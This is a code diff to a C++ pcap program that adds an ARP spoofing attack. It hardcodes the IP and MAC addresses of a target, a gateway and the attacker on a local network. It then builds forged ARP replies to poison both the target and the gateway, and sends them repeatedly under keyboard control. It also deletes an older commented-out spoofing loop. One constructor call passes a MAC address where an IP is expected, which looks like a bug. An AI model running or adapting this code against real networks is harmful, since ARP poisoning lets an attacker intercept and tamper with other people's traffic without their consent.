@@ -1,19 +1,59 @@
 #include "headers/AdapterQuery.h"
 #include "headers/net_structure.h"
+#include "headers/ARPSpoofing.h"
 
-#include <pthread.h>
 #include <iostream>
 
-using std::cin, std::cout;
-
-int us;
+using std::cin, std::cout, std::endl;
 
 void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
 
+#define EXPAND_MAC(A, B, C, D, E, F) {0x##A,0x##B,0x##C,0x##D,0x##E,0x##F}
+#define EXPAND_IP(A, B, C, D) {A,B,C,D}
+
+u_char target_ip[4] = EXPAND_IP(192, 168, 43, 171);
+u_char target_mac[6] = EXPAND_MAC(9c, b6, d0, b9, 1a, 0f);
+
+u_char gateway_ip[4] = EXPAND_IP(192, 168, 43, 1);
+u_char gateway_mac[6] = EXPAND_MAC(B0, EB, 57, 6E, C7, 58);
+
+u_char self_ip[4] = EXPAND_IP(192, 168, 43, 215);
+u_char self_mac[6] = EXPAND_MAC(58, 91, CF, 98, 7B, FF);
+
+u_char broadcast_ip[4] = EXPAND_IP(0, 0, 0, 0);
+u_char broadcast_mac[6] = EXPAND_MAC(FF, FF, FF, FF, FF, FF);
 
 int main() {
+    cout << "sizeof(arp_packet): " << sizeof(arp_packet) << endl;
     string dev_name = list_dev_and_choose_dev();
     pcap_t *adapter = open_adapter(dev_name);
+
+    arp_packet *spoofing_target_packet = arp_packet_constructor(gateway_ip, self_mac,
+                                                                target_ip, target_mac);
+    ARP_packet_sender target_spoofer(adapter, spoofing_target_packet, 10);
+
+    arp_packet *spoofing_gateway_packet = arp_packet_constructor(target_mac, self_mac,
+                                                                 target_ip, target_mac);
+    ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);
+
+
+    char ch;
+    while (cin >> ch) {
+        if (ch == '1') {
+            target_spoofer.start();
+            gateway_spoofer.start();
+        }
+        if (ch == '2') {
+            target_spoofer.stop();
+            gateway_spoofer.stop();
+        }
+        if (ch == '4') {
+            target_spoofer.stop();
+            gateway_spoofer.stop();
+            return 0;
+        }
+    }
+
 //    int choose;
 //    scanf("%d",&us);
 //
@@ -103,24 +143,6 @@ int main() {
 //
 //
 //void *arp_spoofing(void *arg) {
-//    while (true) {
-//        // Send down the deceive_dst_packet
-//        if (pcap_sendpacket(adapter,                                 // Adapter
-//                            (const u_char *) &deceive_dst_packet,    // buffer with the deceive_dst_packet
-//                            sizeof(deceive_dst_packet)               // size
-//        ) != 0) {
-//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
-//            return nullptr;
-//        }
-//        if (pcap_sendpacket(adapter,                                        // Adapter
-//                            (const u_char *) &deceive_gateway_packet,       // buffer with the deceive_dst_packet
-//                            sizeof(deceive_gateway_packet)                  // size
-//        ) != 0) {
-//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
-//            return nullptr;
-//        }
-//        sleep(1);
-//    }
 //}
 
 //void *arp_recover(void *arg) {
